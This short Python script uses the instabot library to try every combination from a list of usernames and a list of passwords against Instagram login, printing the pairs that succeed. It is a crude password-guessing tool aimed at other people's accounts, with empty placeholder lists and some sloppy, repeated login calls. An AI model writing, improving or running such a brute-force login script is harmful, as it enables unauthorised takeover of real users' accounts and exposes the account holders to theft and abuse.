# insta bot for login 
#install - pip install instabot
#import Bot from instabot

from instabot import Bot
#import time
#start_time = time.time()
bot = Bot()
input_usernames="" #enter username as string in list
input_passwords="" #enter password as string in list
#bot.login(username, password)
#to enter repeated password and username

for in_username in input_usernames:
    #takes password form the list,condition applicable
    for in_password in input_passwords:
        print(in_username , in_password)
        if bot.login(username = in_username, password = in_password):
           print(in_username, in_password)

bot.login(username="",password="")

#end_time = time.time()
#print("total time : ",end_time - start_time)
